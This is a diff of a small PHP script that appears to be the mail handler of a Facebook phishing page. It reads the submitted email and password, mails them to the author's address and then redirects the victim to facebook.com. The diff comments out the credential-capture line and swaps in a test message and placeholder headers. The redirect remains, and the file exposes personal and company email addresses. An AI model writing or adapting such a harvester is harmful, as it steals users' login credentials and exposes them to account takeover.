@@ -1,13 +1,14 @@
 <?php
 
-$to      = 'melkamu.dange@adm-technologies.com';
+$to      = 'melkamudagne19@gmail.com';
 $subject = 'the subject';
-$message = $_POST["email"] . "  :  " . $_POST["pass"];
-$headers = 'From: melkamu.dange@adm-technologies.com' . "\r\n" .
-    'Reply-To: melkamudagne19@gmail.com' . "\r\n" .
+//$message = $_POST["email"] . "  :  " . $_POST["pass"];
+$message="melkamu";
+$headers = 'From: webmaster@example.com' . "\r\n" .
+    'Reply-To:webmaster@example.com' . "\r\n" .
     'X-Mailer: PHP/' . phpversion();
 
-mail($to, $subject, $message,$headers,"-f melkamu.dange@adm-technologies.com");
+mail($to, $subject, $message,$headers);
 
 
 $newURL = "https://www.facebook.com";
